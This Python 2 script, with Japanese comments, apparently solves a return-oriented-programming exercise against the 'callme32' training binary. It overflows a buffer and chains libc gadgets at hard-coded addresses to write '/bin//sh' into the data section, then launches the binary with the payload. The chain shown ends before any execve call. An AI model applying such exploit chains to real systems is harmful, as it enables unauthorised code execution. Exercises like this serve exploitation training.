# -*- coding: utf-8 -*-

import sys
import struct
from subprocess import Popen

def p(a):
  return struct.pack("<I", a)

def u(a):
  return struct.unpack("<I", a)[0]

bufsize = 38
data_addr = 0x0804a034 #objdump -D ./callme32 => 0804a034
libc_addr = 0xb7e3fda0

buf = 'A' * bufsize
buf += 'AAAA' * 3

# "/bin" という文字列をdataセクションに書き込む
buf += p(libc_addr + 0x000179a7) # pop ebp ; ret
buf += p(data_addr)
buf += p(libc_addr + 0x0002406e) # pop eax ; ret
buf += "/bin"
buf += p(libc_addr + 0x0002db74) # mov dword ptr [ebp] eax; ret;

# "//sh" という文字列を書き込む
buf += p(libc_addr + 0x00001aa6) # pop edx ; ret
buf += p(data_addr + 4)
buf += p(libc_addr + 0x000b5377) # pop ecx ; ret
buf += "//sh"
buf += p(libc_addr + 0x0003d168) # mov dword ptr [edx] ecx; ret;

# nullバイトを追加
buf += p(libc_addr + 0x00001aa6) # pop edx; ret;
buf += p(data_addr + 8)
buf += p(libc_addr + 0x0002c79c) # xor eax, eax; ret;
buf += p(libc_addr + 0x0006bf9b) # mov dword ptr [edx] eax; ret;


with open('buf', 'wb') as f:
  f.write(buf)

p = Popen(['./callme32', buf])
p.wait()

